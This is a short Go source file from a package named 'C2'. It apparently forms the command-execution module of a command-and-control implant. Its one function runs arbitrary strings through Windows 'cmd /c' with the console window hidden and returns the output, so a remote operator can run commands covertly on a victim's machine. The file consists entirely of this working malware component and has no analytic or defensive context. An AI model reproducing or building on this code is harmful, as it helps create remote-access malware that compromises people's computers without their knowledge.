package C2

import (
	"os/exec"
	"strings"
	"syscall"
)

func executeCommand(commandToExecute string) string {
	splitArgs := strings.Split(commandToExecute, " ")

	// Commands run via cmd /c <command> (e.g. cmd /c dir)
	arguments := append([]string{"/c"}, splitArgs...)
	cmdInstance := exec.Command("cmd", arguments...)
	cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmdInstance.Dir = currentWorkingDir
	outCommand, err := cmdInstance.Output()

	if err != nil {
		return err.Error()
	}

	return string(outCommand)
}
